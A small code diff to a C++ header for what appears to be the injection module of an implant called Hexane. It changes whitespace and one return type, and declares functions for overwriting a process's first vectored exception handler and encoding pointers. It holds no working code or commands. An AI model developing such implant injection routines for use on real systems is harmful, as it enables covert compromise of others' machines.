@@ -1,8 +1,7 @@
 #ifndef HEXANE_IMPLANT_INJECT_HPP
 #define HEXANE_IMPLANT_INJECT_HPP
+
 #include <core/corelib.hpp>
-
-
 namespace Injection {
 
     struct _code {
@@ -31,7 +30,7 @@ namespace Injection {
 
         FUNCTION UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask);
         FUNCTION UINT_PTR PointerEncoder(const uintptr_t &pointer, bool encode);
-        FUNCTION LONG OverwriteFirstHandler(const _veh_writer &writer);
+        FUNCTION NTSTATUS OverwriteFirstHandler(const _veh_writer &writer);
     }
 }
 #endif //HEXANE_IMPLANT_INJECT_HPP
